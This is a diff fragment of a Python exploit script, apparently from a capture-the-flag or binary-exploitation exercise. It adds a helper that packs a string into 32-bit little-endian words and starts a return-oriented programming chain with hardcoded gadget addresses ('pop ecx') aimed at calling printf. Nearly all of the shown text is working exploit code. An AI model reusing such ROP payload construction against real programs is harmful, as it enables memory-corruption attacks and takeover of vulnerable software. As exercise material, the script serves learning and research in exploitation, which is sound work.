@@ -19,8 +19,28 @@ We can use 125 to a register value if we can put
 4 pops in one ROP. prop number, plaintex, ROP with 3 pops, and printf address
 """
 
+
+def convert_string_to_payload(string, max_str_len, payload_len):
+    payload = []
+    string = string.replace("\n", " ")
+
+    string = string.ljust(max_str_len, chr(0))
+    string = string[:max_str_len] + chr(0)
+
+    string = string.ljust(4 * payload_len, chr(0))
+    string = string[:4 * payload_len - 1] + chr(0)
+    for i in range(payload_len):
+        frag = string[4 * i: 4 * (i + 1)]
+        word = 0x0;
+        for j in range(4):
+            word <<= 8
+            word += ord(frag[-(j + 1)])
+        payload.append(word)
+    return payload
+
+
 # Print the value of GLB using main.
-payload = [0x00000000] * 6 + \
+payload = convert_string_to_payload("\t    6! = ", 9, 6) + \
           [
               0x080640c1,  # pop ecx
               0x080e6ce0,  # format string address
